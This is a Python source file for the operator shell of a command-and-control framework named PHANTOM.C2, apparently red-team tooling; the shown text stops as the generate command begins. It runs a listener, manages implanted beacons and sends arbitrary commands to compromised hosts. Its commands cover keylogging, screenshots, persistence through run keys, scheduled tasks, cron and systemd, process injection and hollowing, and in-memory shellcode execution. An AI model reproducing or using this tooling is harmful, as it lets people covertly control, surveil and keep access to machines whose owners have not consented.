import cmd
import sys
import os
from datetime import datetime
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

from phantom.core.c2_server import server_instance, c2_state
from phantom.core.session import session
from phantom.utils.notifier import notifier
from phantom.utils.c2_helpers import BEACON_COMMANDS, format_beacon_output
from phantom.utils.paths import certs_dir, certs_exist
from phantom.utils.state import use_mtls

console = Console()


def _resolve_beacon_id(bid: str) -> str | None:
    """Match beacon by full or prefix ID."""
    beacons = c2_state.get_beacons()
    if bid in beacons:
        return bid
    matches = [k for k in beacons if k.startswith(bid)]
    if len(matches) == 1:
        return matches[0]
    return None

def build_c2_banner():
    return r"""
[bold magenta]
  ██████╗ ██╗  ██╗ █████╗ ███╗  ██╗████████╗ ██████╗ ███╗  ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗ ██║╚══██╔══╝██╔═══██╗████╗████║
  ██████╔╝███████║███████║██╔██╗██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚████║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚███║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
[/bold magenta]
  [dim]──────────────────────────────────────────────────────────[/dim]
  [bold magenta]PHANTOM.C2 — Command & Control[/bold magenta]  [dim]v1.0.0[/dim]
  [dim]Secure Encrypted Asynchronous Communications[/dim]
"""

def _c2_elapsed() -> str:
    """Human-readable elapsed time since the engagement started."""
    started = getattr(session, "engagement_started", None)
    if not started:
        return "0s"
    try:
        from datetime import datetime as _dt
        secs = max(0, int((_dt.now() - _dt.fromisoformat(started)).total_seconds()))
    except Exception:
        return "0s"
    h, rem = divmod(secs, 3600)
    m, s = divmod(rem, 60)
    if h:
        return f"{h}h {m}m"
    if m:
        return f"{m}m {s}s"
    return f"{s}s"


def _c2_dashboard():
    """Compact Rich panel shown on C2 shell entry (like the main shell)."""
    from rich.panel import Panel
    if server_instance.thread and server_instance.thread.is_alive():
        proto = "HTTPS" if server_instance.ssl_context else "HTTP"
        listener = f"[bold green]{proto} {server_instance.host}:{server_instance.port}[/]"
    else:
        listener = "[red]STOPPED[/]"
    mtls = "[green]ON[/]" if use_mtls() else "[red]OFF[/]"
    n = len(c2_state.get_beacons())
    target = session.target or "—"
    panel = Panel(
        f"[bold magenta]Listener:[/] {listener}   |   "
        f"[bold cyan]Beacons:[/] {n}   |   "
        f"[bold yellow]Target:[/] {target}   |   "
        f"[bold white]mTLS:[/] {mtls}   |   "
        f"[bold green]⏱ {_c2_elapsed()}[/]",
        title="[bold]Phantom C2 Status[/]",
        border_style="magenta",
    )
    return panel


def _c2_separator() -> str:
    return "[dim]──────────────────────────────────────────[/dim]"


def _c2_status_bar() -> str:
    """One-line C2 status: listener · beacons · active beacon · target · timer."""
    listener = "[red]listener STOPPED[/]"
    if server_instance.thread and server_instance.thread.is_alive():
        proto = "HTTPS" if server_instance.ssl_context else "HTTP"
        listener = f"[bold green]{proto} {server_instance.host}:{server_instance.port}[/]"
    n = len(c2_state.get_beacons())
    if n:
        beacons = f"[bold green]● {n} beacon(s)[/]"
    else:
        beacons = "[dim]0 beacons[/]"
    target = session.target or "—"
    return (f"[bold magenta]C2[/]  {listener}  ·  {beacons}  ·  "
            f"target: [yellow]{target}[/]  ·  [dim]⏱ {_c2_elapsed()}[/]")


def _c2_context_hint(active_beacon: Optional[str] = None) -> str:
    """Faded one-line hint: the obvious NEXT action for the C2 state."""
    hints = []
    if not (server_instance.thread and server_instance.thread.is_alive()):
        hints.append("listeners start 8080")
        hints.append("generate <platform>")
    elif not c2_state.get_beacons():
        hints.append("generate windows → run on target")
        hints.append("beacons")
    elif not active_beacon:
        hints.append("interact <beacon-id>")
        hints.append("beacons")
    else:
        hints.append("results · beacon-help")
        hints.append("back")
    hints.append("help")
    return "[dim]▸ " + "   ".join(hints[:4]) + "[/dim]"


class C2Shell(cmd.Cmd):
    intro = ""
    prompt = "\033[1;35mC2\033[0m > "

    def __init__(self):
        super().__init__()
        self.active_beacon = None
        self._intr_count = 0
        self._last_intr = 0.0
    def preloop(self):
        from datetime import datetime as _dt
        if not getattr(session, "engagement_started", None):
            session.engagement_started = _dt.now().isoformat(timespec="seconds")
        console.print(build_c2_banner())
        console.print(_c2_dashboard())
        console.print(_c2_separator())
        console.print(_c2_context_hint())
        console.print()

    def postcmd(self, stop, line):
        if self.active_beacon:
            beacons = c2_state.get_beacons()
            info = beacons.get(self.active_beacon, {})
            last_seen_str = info.get("last_seen", "")
            
            status_color = "\033[31m" # Red
            if last_seen_str:
                last_seen_dt = datetime.fromisoformat(last_seen_str)
                diff = (datetime.now() - last_seen_dt).total_seconds()
                if diff < 15: status_color = "\033[32m" # Green
                elif diff < 60: status_color = "\033[33m" # Yellow
            
            self.prompt = f"\033[1;35mC2\033[0m ({status_color}{self.active_beacon}\033[0m) > "
        else:
            self.prompt = "\033[1;35mC2\033[0m > "
        # Same live status bar + faded context hint as the main shell
        if line.strip():
            try:
                console.print(_c2_separator())
                console.print(_c2_status_bar())
                console.print(_c2_context_hint(self.active_beacon))
            except Exception:
                pass
        return stop

    def cmdloop(self, intro=None):
        """Ctrl+C cancels input + shows a hint that auto-fades; a second
        Ctrl+C within 2 s exits. Mirrors the main shell behavior."""
        import time as _time

        self.preloop()
        if intro is not None:
            self.intro = intro
        if self.intro:
            self.stdout.write(str(self.intro) + "\n")
        self.old_completer = None
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey + ": complete")
            except (ImportError, AttributeError):
                pass

        stop = None
        try:
            while not stop:
                try:
                    if self.cmdqueue:
                        line = self.cmdqueue.pop(0)
                    else:
                        if self.use_rawinput:
                            try:
                                line = input(self.prompt)
                            except EOFError:
                                # stdin closed (pipe end, scripted run): exit
                                # the shell instead of dispatching a literal
                                # "EOF" command to the active beacon (which
                                # made `sh: 1: EOF: not found` on targets).
                                console.print()
                                break
                        else:
                            self.stdout.write(self.prompt)
                            self.stdout.flush()
                            line = self.stdin.readline()
                            if not len(line):
                                console.print()
                                break
                            else:
                                line = line.rstrip("\r\n")
                    line = self.precmd(line)
                    stop = self.onecmd(line)
                    stop = self.postcmd(stop, line)
                    self._intr_count = 0
                except KeyboardInterrupt:
                    now = _time.monotonic()
                    if now - self._last_intr > 2.0:
                        self._intr_count = 0
                    self._intr_count += 1
                    self._last_intr = now
                    if self._intr_count >= 2:
                        console.print("\n[dim]C2 closed.[/dim]\n")
                        raise SystemExit(0)
                    console.print()
                    console.print(
                        "[bold yellow]^C  —  Ctrl+C again to exit, or keep typing.[/bold yellow]")
                    continue
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey and self.old_completer is not None:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except (ImportError, AttributeError):
                    pass



    def do_listeners(self, arg):
        """listeners [start <port> [host] [use_ssl]] | stop] - Manage C2 listener."""
        parts = arg.split()
        if not parts:
            if server_instance.thread and server_instance.thread.is_alive():
                proto = "HTTPS" if server_instance.use_ssl else "HTTP"
                console.print(f"[*] Listener [green]ACTIVE[/green] ({proto}) on {server_instance.host}:{server_instance.port}")
            else:
                console.print("[*] Listener [red]INACTIVE[/red]")
            return

        action = parts[0]
        if action == "start":
            try:
                port = int(parts[1]) if len(parts) > 1 else (session.lport or 8080)
                host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
                use_ssl = parts[3].lower() in ("true", "1", "yes", "https") if len(parts) > 3 else True
                server_instance.start(host=host, port=port, use_ssl=use_ssl)
                proto = "HTTPS" if use_ssl else "HTTP"
                notifier.success(f"Started {proto} listener on {host}:{port}")
            except Exception as e:
                notifier.error(f"Failed to start listener: {e}")
        elif action == "stop":
            server_instance.stop()
            notifier.success("Stopped listener")
        else:
            notifier.error("Usage: listeners start [port] [host] [use_ssl] | listeners stop")

    def do_certs(self, arg):
        """certs [status|uninstall] - Inspect or remove the TLS certificate pair."""
        action = arg.strip().lower()
        if action == "uninstall":
            if server_instance.thread and server_instance.thread.is_alive():
                notifier.error("Stop the listener first (listeners stop).")
                return
            import shutil
            cert_dir = certs_dir()
            if not os.path.exists(cert_dir):
                notifier.info("No certs directory to remove.")
                return
            shutil.rmtree(cert_dir)
            notifier.success("Removed TLS certificates (server.crt/server.key).")
            return
        # default: status
        if certs_exist():
            cert_dir = certs_dir()
            import glob
            patterns = ("server.*", "mtls_server.*", "client_ca.*")
            files = [path for pattern in patterns
                     for path in glob.glob(os.path.join(cert_dir, pattern))]
            for f in sorted(set(files)):
                notifier.info(f"[{os.path.basename(f)}] ({os.path.getsize(f)} bytes)")
            notifier.success("TLS certificates present. Listener may run HTTPS.")
        else:
            notifier.warn("No TLS certificates. Start an HTTPS listener to auto-generate them.")

    def do_config(self, arg):
        """config (status|rotate-api-token|mtls-on|mtls-off) - Show/rotate auto-generated C2 secrets."""
        from rich.table import Table as _Table
        action = arg.strip().lower()
        if action in ("rotate", "rotate-api-token", "regenerate-api-token"):
            try:
                from phantom.utils.c2_crypto import regenerate_api_token
                token = regenerate_api_token()
                notifier.success(f"API token rotated. New value: {token}")
                notifier.warn("Update any external client (Telegram bot, scripts) that holds the old token.")
            except Exception as e:
                notifier.error(f"Rotation failed: {e}")
            return
        if action in ("mtls-on", "mtls on"):
            from phantom.utils.state import set_flag
            set_flag("PHANTOM_MTLS_REQUIRED", True)
            notifier.success("mTLS enabled (secure default). Listener will require HTTPS + client certs on beacon routes.")
            return
        if action in ("mtls-off", "mtls off"):
            from phantom.utils.state import set_flag
            set_flag("PHANTOM_MTLS_REQUIRED", False)
            notifier.warn("mTLS disabled — beacon channel no longer requires client certificates.")
            return
        # default: status
        from phantom.utils.state import status as state_status
        info = state_status()
        table = _Table(title="[bold]Phantom C2 Operator State[/]", border_style="magenta")
        table.add_column("Setting", style="cyan")
        table.add_column("Value", style="white")
        for key, value in info.items():
            table.add_row(str(key), str(value))
        console.print(table)
        notifier.info("Secrets live in data/phantom_state.json (gitignored). Env vars override persisted values.")

    def do_malleable(self, arg):
        """malleable [show|save|recommend] - Manage malleable C2 profiles"""
        from phantom.utils.malleable import handle_malleable_command
        handle_malleable_command(arg)

    def do_beacons(self, arg):
        """beacons - list active beacons with real-time status"""
        beacons = c2_state.get_beacons()
        if not beacons:
            notifier.warn("No active beacons.")
            return

        table = Table(title="Active Beacons", border_style="magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Status", justify="center")
        table.add_column("Source IP", style="green")
        table.add_column("User@Host", style="magenta")
        table.add_column("OS", style="blue")
        table.add_column("Last Seen", style="yellow")
        
        now = datetime.now()
        for bid, info in beacons.items():
            last_seen_str = info.get("last_seen", "")
            if info.get("status") == "exited":
                # beacon confirmed shutdown — never shown as live
                status = "[dim red]EXITED[/]"
                last_seen_display = f"at {info.get('exited_at', '?')}"
                table.add_row(bid, status, info.get("ip", ""),
                              f"{info.get('user', '')}@{info.get('hostname', '')}",
                              info.get("os", ""), last_seen_display)
                continue
            status = "[red]OFFLINE[/]"
            
            if last_seen_str:
                last_seen_dt = datetime.fromisoformat(last_seen_str)
                diff = (now - last_seen_dt).total_seconds()
                
                if diff < 15: # Se visto negli ultimi 15 secondi (sleep 5s + jitter)
                    status = "[green]ACTIVE[/]"
                elif diff < 60:
                    status = "[yellow]STALE[/]"
                
                last_seen_display = f"{int(diff)}s ago"
            else:
                last_seen_display = "Never"
            
            user = info.get("user", "")
            host = info.get("hostname", "")
            user_host = f"{user}@{host}" if user or host else "Unknown"
            
            table.add_row(
                bid, 
                status,
                info.get("ip", "Unknown"), 
                user_host,
                info.get("os", "Unknown"),
                last_seen_display
            )
            
        console.print(table)

    def do_payloads(self, arg):
        """payloads [id] - list compiled payload droppers (optionally show one by id)"""
        from phantom.utils.payload_manager import get_custom_beacons

        history = get_custom_beacons()
        if not history:
            notifier.warn("No compiled payloads in history.")
            return

        bid = arg.strip()
        if bid:
            matches = [e for e in history if e.get("id", "").startswith(bid)]
            if not matches:
                notifier.error(f"No payload found with id '{bid}'.")
                return
            if len(matches) > 1:
                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
                return
            entry = matches[0]
            console.print(Panel(
                entry.get("command", ""),
                title=f"[bold]{entry.get('platform', 'unknown').upper()}[/] — {entry.get('description', '')}",
                subtitle=f"Created: {entry.get('created_at', 'Unknown')}  |  Source: {entry.get('source', 'unknown')}",
                border_style="magenta",
            ))
            return

        table = Table(title="Compiled Payload History", border_style="magenta")
        table.add_column("ID", style="cyan", no_wrap=True)
        table.add_column("Platform", style="green")
        table.add_column("Description", style="white")
        table.add_column("Source", style="dim")
        table.add_column("Created", style="yellow")
        table.add_column("Command Preview", style="dim", overflow="fold")

        for entry in reversed(history):
            cmd = entry.get("command", "")
            preview = (cmd[:60] + "...") if len(cmd) > 63 else cmd
            table.add_row(
                entry.get("id", "")[:8] + "...",
                entry.get("platform", "unknown"),
                entry.get("description", ""),
                entry.get("source", ""),
                entry.get("created_at", ""),
                preview,
            )

        console.print(table)
        console.print("[dim]Use 'payloads <full-id>' to view the complete dropper command.[/dim]")

    def do_audit(self, arg):
        """audit [verify|tail N] - inspect the immutable C2 audit log.

        audit            show the last 15 events
        audit tail 50    show the last 50 events
        audit verify     verify the hash chain (chain-of-custody proof)
        """
        from phantom.utils.audit_log import audit_log
        parts = arg.strip().split()
        if parts and parts[0] == "verify":
            ok, count, bad = audit_log.verify()
            if ok:
                notifier.success(f"Audit chain OK: {count} record(s), "
                                 "no tampering detected.")
            else:
                notifier.error(f"AUDIT CHAIN BROKEN at record {count}: "
                               f"{bad}")
            return
        n = 15
        if parts and parts[0] == "tail" and len(parts) > 1:
            try:
                n = max(1, int(parts[1]))
            except ValueError:
                pass
        records = audit_log.tail(n)
        if not records:
            console.print("[dim]Audit log empty — events are recorded as "
                          "beacons register, tasks queue and results arrive.[/]")
            return
        table = Table(title="C2 Audit Log (hash-chained, append-only)",
                      border_style="magenta")
        table.add_column("#", style="dim", justify="right")
        table.add_column("Time", style="yellow")
        table.add_column("Event", style="cyan")
        table.add_column("Details", style="white", overflow="fold")
        for r in records:
            if "_corrupt" in r:
                table.add_row("?", "?", "CORRUPT", r.get("_corrupt", "")[:80])
                continue
            details = {k: v for k, v in r.items()
                       if k not in ("seq", "ts", "event", "prev", "hash")}
            table.add_row(str(r.get("seq", "")), r.get("ts", ""),
                          r.get("event", ""), str(details)[:160])
        console.print(table)
        console.print("[dim]Run 'audit verify' to prove the log was not "
                      "altered (client chain-of-custody).[/]")

    def do_interact(self, arg):
        """interact <beacon_id> - drop into beacon interaction mode (prefix match supported)"""
        bid = arg.strip()
        if not bid:
            notifier.error("Usage: interact <beacon_id>")
            return
        resolved = _resolve_beacon_id(bid)
        if not resolved:
            matches = [k for k in c2_state.get_beacons() if k.startswith(bid)]
            if len(matches) > 1:
                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
            else:
                notifier.error("Invalid or missing Beacon ID.")
            return

        self.active_beacon = resolved
        notifier.success(f"Interacting with beacon {resolved}")
        console.print("[dim]Type 'beacon-help' for agent commands. Use 'results' after tasks complete.[/dim]")

    def do_back(self, arg):
        """back - return to main C2 shell from interaction mode"""
        if self.active_beacon:
            self.active_beacon = None
            notifier.success("Returned to global C2 context.")
        else:
            notifier.warn("Already in global context.")

    def default(self, line):
        """Execute a command on the active beacon and wait for result."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        # Queue the task
        task_id = c2_state.queue_task(self.active_beacon, line)
        notifier.info(f"Task queued. ID: {task_id}. Waiting for result...")
        
        # Poll for result automatically
        self._wait_for_result(task_id)

    def do_results(self, arg):
        """results [n|all] - show results for the active beacon (default last 10)"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        results = c2_state.get_results(self.active_beacon)
        if not results:
            notifier.warn("No results available for this beacon.")
            return

        # Handle filtering
        limit = 10
        show_all = False
        if arg.strip():
            if arg.strip().lower() == "all":
                show_all = True
            else:
                try:
                    limit = int(arg.strip())
                except ValueError:
                    notifier.error("Usage: results [n|all]")
                    return

        to_show = results if show_all else results[-limit:]
        
        if not show_all and len(results) > limit:
            console.print(f"[dim]Showing last {limit} results (out of {len(results)}). Use 'results all' to see everything.[/dim]")

        for res in to_show:
            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ({res.get('time', 'Unknown')}) ---[/]")
            display, extra = format_beacon_output(res["output"])
            console.print(display)
            if extra:
                notifier.success(extra)

    def do_persist(self, arg):
        """persist [runkey|schtask|cron|systemd] - Generate and queue a persistence task for the active beacon."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        parts = arg.split()
        if not parts:
            notifier.error("Usage: persist [runkey|schtask|cron|systemd]")
            return

        method = parts[0]
        beacons = c2_state.get_beacons()
        info = beacons.get(self.active_beacon, {})
        os_type = info.get("os", "").lower()
        
        # Determine current binary path (best guess)
        # In a real scenario, we might want to move the beacon first.
        # For now, let's assume we use the current path or ask the user.
        binary_path = input("[?] Full path of the beacon on target: ").strip()
        if not binary_path:
            notifier.error("Path is required for persistence.")
            return

        from phantom.core.persistence import persistence_manager
        cmd = ""
        if method == "runkey": 
            # Use native persistence instead of shell command
            cmd = "persist PhantomBeacon"
        elif method == "schtask": 
            cmd = persistence_manager.get_windows_schtask(binary_path)
        elif method == "cron": 
            cmd = persistence_manager.get_linux_cron(binary_path)
        elif method == "systemd": 
            cmd = persistence_manager.get_linux_systemd(binary_path)
        elif method == "native":
            cmd = "persist PhantomUpdate"
        else:
            notifier.error(f"Unknown persistence method: {method}")
            return

        if cmd:
            task_id = c2_state.queue_task(self.active_beacon, cmd if cmd.startswith("persist") else f"shell {cmd}")
            notifier.success(f"Persistence task queued: {method}")
            notifier.info(f"Task ID: {task_id}")

    def do_help(self, arg: str):
        """help [command] - Show the C2 command reference."""
        if arg.strip():
            func = getattr(self, f"do_{arg.strip().replace('-', '_')}", None)
            if func and func.__doc__:
                from rich.markup import escape
                console.print(Panel(escape(func.__doc__.strip()),
                                    title=f"[bold magenta]Help: {arg}[/]",
                                    border_style="magenta"))
            else:
                notifier.error(f"No help available for '{arg}'.")
            return

        table = Table(title="[bold]Phantom C2 Commands[/]", border_style="magenta")
        table.add_column("Command", style="cyan")
        table.add_column("Description", style="white")
        rows = [
            # ── listener & infrastructure ──
            ("listeners start [port] [host] [use_ssl]", "Start the C2 listener (default HTTPS + mTLS)"),
            ("listeners stop", "Stop the C2 listener"),
            ("listeners", "Show listener status"),
            ("certs [status|uninstall]", "Inspect or remove TLS certificate pair"),
            ("config [status|rotate-api-token|mtls-on|mtls-off]",
             "Show/rotate auto-generated C2 secrets & mTLS toggle"),
            ("malleable [show|save|recommend]", "Manage malleable C2 profiles (URIs, UA, headers)"),
            # ── beacons ──
            ("beacons", "List active beacons with live status"),
            ("interact <id>", "Enter a beacon terminal (commands go to the beacon)"),
            ("back", "Return to global C2 context"),
            ("results [n|all]", "Show results for the active beacon"),
            ("beacon-auth [status|rotate|revoke] [id]", "Manage per-beacon HMAC identity keys"),
            ("beacon-help", "List ALL commands supported by the beacon agent"),
            ("health", "Beacon health self-report (uptime, check-ins, tasks, cadence)"),
            ("set-sleep <ms> [jitter%]", "Rotate beacon cadence mid-session (no restart)"),
            # ── post-exploitation (tasks sent to the active beacon) ──
            ("screenshot", "Capture a screenshot on the active beacon"),
            ("keylog start|stop|status|dump", "Keystroke logger on the active beacon (dump = retrieve buffer)"),
            ("persist [method]", "Install persistence (runkey/systemd/cron — auto with autopersist)"),
            ("autopersist", "Auto-detect OS and install the right persistence"),
            ("inject <pid>", "Inject a new beacon into an existing process (2 beacons)"),
            ("inject-tl <pid> | inject-eb <pid>", "Thread-layout / early-bird injection variants"),
            ("migrate", "Hollow a new process and move the beacon (1 beacon)"),
            ("mem-run <b64>", "Run base64 shellcode in-memory (Windows)"),
            # ── payloads & delivery ──
            ("generate [platform] [--profile <json>]", "Compile + dropper (optionally with malleable profile)"),
            ("generate-shellcode [platform]", "Generate base64 shellcode for inject/migrate/mem-run"),
            ("payloads", "List generated payloads on disk"),
            # ── ops & audit ──
            ("audit [verify|tail N]", "Immutable hash-chained C2 audit log (chain-of-custody)"),
            ("telegram", "Telegram bot channel status (remote C2 control)"),
            ("exit / quit", "Exit the C2 shell"),
        ]
        for cmd, desc in rows:
            table.add_row(cmd, desc)
        console.print(table)
        console.print("[dim]Type 'help <command>' for details.[/]")
        console.print(f"[dim]PHANTOM.C2 v1.0.0 — {_c2_elapsed()} since session start[/dim]")

    def do_beacon_help(self, arg):
        """beacon-help - list commands supported by the C++ beacon agent"""
        console.print(Panel(BEACON_COMMANDS, title="[bold]Beacon Agent Commands[/]", border_style="magenta"))

    def do_beacon_auth(self, arg):
        """beacon-auth <status|rotate|revoke> [beacon_id] - Manage beacon identity keys."""
        from base64 import b64encode
        from phantom.utils.beacon_auth import (
            get_beacon_record, rotate_beacon, revoke_beacon,
        )

        parts = arg.split()
        action = parts[0].lower() if parts else "status"
        target = parts[1] if len(parts) > 1 else self.active_beacon
        if action not in {"status", "rotate", "revoke"}:
            notifier.error("Usage: beacon-auth <status|rotate|revoke> [beacon_id]")
            return
        if not target:
            notifier.error("Select a beacon with 'interact <id>' or provide its ID.")
            return
        resolved = _resolve_beacon_id(target) or target
        record = get_beacon_record(resolved)
        if action == "status":
            if not record:
                notifier.warn(f"No enrolled identity for {resolved}.")
                return
            notifier.info(
                f"Beacon auth {resolved}: {record.get('status', 'unknown')} "
                f"(key version {record.get('version', '?')}).")
            return
        if action == "revoke":
            if revoke_beacon(resolved):
                notifier.success(f"Revoked beacon identity: {resolved}")
            else:
                notifier.error(f"No enrolled identity for {resolved}.")
            return

        if not record or record.get("status") != "active":
            notifier.error(f"No active enrolled identity for {resolved}.")
            return
        try:
            rotated = rotate_beacon(resolved)
            encoded = b64encode(rotated["secret"]).decode("ascii")
            task_id = c2_state.queue_task(resolved, f"auth-rotate {encoded}")
            notifier.success(
                f"Key rotation queued for {resolved} (version {rotated['version']}).")
            notifier.info(f"Task ID: {task_id}; previous key grace window: 120s.")
        except (OSError, ValueError) as exc:
            notifier.error(f"Key rotation failed: {exc}")

    def do_autopersist(self, arg):
        """autopersist - Automatically attempt persistence based on OS detection."""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        # Auto-detect OS from beacon info
        beacons = c2_state.get_beacons()
        os_type = beacons.get(self.active_beacon, {}).get("os", "").lower()
        
        # Default to systemd for linux/android, runkey for windows
        if "windows" in os_type:
            method = "runkey"
        else:
            method = "systemd"
            
        notifier.info(f"Auto-detecting persistence method for {os_type}: {method}")
        # The beacon's own `persist` built-in installs persistence for its
        # own running binary — no path needed, the beacon resolves it.
        task_id = c2_state.queue_task(self.active_beacon, f"persist {method}")
        notifier.success(f"Auto-persistence ({method}) task queued (ID: {task_id})")

    def do_generate_shellcode(self, arg):
        """generate_shellcode [platform] - Generate Base64 shellcode for inject/migrate."""
        import os
        import base64
        import phantom
        
        platform = arg.strip() or "windows"
        
        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
        if platform == "windows":
            beacon_path = os.path.join(beacon_dir, "beacon.bin")
        else:
            from phantom.utils.builder import _PLATFORM_OUT
            if platform not in _PLATFORM_OUT:
                from rich.console import Console
                console = Console()
                console.print(f"[red]Invalid platform. Choose from: {list(_PLATFORM_OUT.keys())}[/red]")
                return
            beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
        
        if not os.path.exists(beacon_path):
            notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate {platform}' first.")
            return
            
        with open(beacon_path, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
            
        from rich.console import Console
        from rich.panel import Panel
        console = Console()
        console.print(Panel(b64, title=f"Base64 Shellcode ({platform})", border_style="green"))
        console.print("[dim]Copy this string to use with 'inject <pid> <string>' or 'migrate <string>'[/dim]")

    def _wait_for_result(self, task_id, timeout=30):
        """Helper to poll for a specific task result."""
        import time
        from phantom.utils.c2_helpers import format_beacon_output
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            results = c2_state.get_results(self.active_beacon)
            for res in reversed(results):
                if res['task_id'] == task_id:
                    display, extra = format_beacon_output(res["output"])
                    console.print(f"\n[bold green]Result for Task {task_id}:[/]")
                    console.print(display)
                    if extra: notifier.success(extra)
                    return True
            time.sleep(1) # Poll every second
        
        notifier.warn(f"Task {task_id} queued but result not ready. Check later with 'results'.")
        return False

    def _beacon_platform(self) -> str:
        """Detect active beacon platform from its ID prefix."""
        if not self.active_beacon:
            return ""
        bid = self.active_beacon.upper()
        if bid.startswith("WIN"): return "windows"
        if bid.startswith("LNX"): return "linux"
        if bid.startswith("AND"): return "android"
        return ""

    def _inject_payload_path(self, platform: str) -> str:
        """Return path to platform-specific XOR'd inject payload."""
        import os
        import phantom
        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
        mapping = {
            "windows": "beacon_xored.bin",
            "linux": "beacon_linux_xored.bin",
            "android": "beacon_android_xored.bin",
        }
        return os.path.join(beacon_dir, mapping.get(platform, ""))

    def do_inject(self, arg):
        """inject <pid> - Inject beacon into a remote process.
        
        Auto-detects platform and uses the appropriate pre-compiled payload.
        On Linux/Android, writes ELF to /tmp and injects execve stub via ptrace.
        """
        import os
        import base64
        import phantom
        
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        platform = self._beacon_platform()
        
        parts = arg.split()
        if len(parts) == 2:
            pid, b64 = parts
        elif len(parts) == 1:
            pid = parts[0]
            beacon_path = self._inject_payload_path(platform)
            if not beacon_path or not os.path.exists(beacon_path):
                notifier.error(f"Inject payload not found for {platform}. Run 'generate {platform}' first.")
                return
            with open(beacon_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()
        else:
            notifier.error("Usage: inject <pid> [base64_shellcode]")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"inject {pid} {b64}")
        notifier.info(f"Injection task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_migrate(self, arg):
        """migrate [pid] - Migrate beacon into a new process.
        
        Auto-detects platform: Windows uses process hollowing,
        Linux/Android writes ELF to /tmp, forks, and injects execve stub.
        """
        import os
        import base64
        import phantom
        
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        platform = self._beacon_platform()
        parts = arg.split()
        
        if len(parts) >= 1:
            # Accept optional PID arg (ignored on Linux/Android)
            beacon_path = self._inject_payload_path(platform)
            if not beacon_path or not os.path.exists(beacon_path):
                notifier.error(f"Migrate payload not found for {platform}. Run 'generate {platform}' first.")
                return
            with open(beacon_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()
        else:
            notifier.error("Usage: migrate [pid]")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"migrate {b64}")
        notifier.info(f"Migration task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_mem_run(self, arg):
        """mem-run <b64_shellcode> - Execute shellcode in memory (Windows/Linux)."""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
            
        b64 = arg.strip()
        if not b64:
            notifier.error("Usage: mem-run <base64_shellcode>")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"mem-run {b64}")
        notifier.info(f"Memory execution task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_keylog(self, arg):
        """keylog <start|stop|status|dump> - Manage keylogger instance (Windows only)"""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        parts = arg.split()
        if not parts or parts[0] not in ["start", "stop", "status", "dump"]:
            notifier.error("Usage: keylog <start|stop|status|dump [filter]>")
            return
            
        cmd = f"keylog {parts[0]}"
        if parts[0] == "dump" and len(parts) > 1:
            cmd += " " + " ".join(parts[1:])
        task_id = c2_state.queue_task(self.active_beacon, cmd)
        notifier.info(f"Keylog {parts[0]} task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_screenshot(self, arg):
        """screenshot - Capture a screenshot of the target (Windows only)"""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        task_id = c2_state.queue_task(self.active_beacon, "screenshot")
        notifier.info(f"Screenshot task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_health(self, arg):
        """health - Beacon health self-report: uptime, check-in ok/fail
        counters, tasks done, current sleep/jitter cadence, build id."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <id>' first.")
            return
        task_id = c2_state.queue_task(self.active_beacon, "health")
        notifier.info(f"Health task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_set_sleep(self, arg):
        """set-sleep <ms> [jitter%] - Rotate the beacon cadence mid-session
        (no restart, no redeploy). The beacon applies it at the next check-in."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <id>' first.")
            return
        parts = arg.split()
        if not parts or not parts[0].isdigit():
            notifier.error("Usage: set-sleep <ms> [jitter%]")
            return
        cmd = f"set-sleep {parts[0]}"
        if len(parts) > 1 and parts[1].isdigit():
            cmd += f" {parts[1]}"
        task_id = c2_state.queue_task(self.active_beacon, cmd)
        notifier.info(f"Cadence rotation queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_generate(self, arg):
        """generate [windows|linux|macos|android] [x64|x86] [--profile <json>] - Generate beacon and dropper"""
        import os
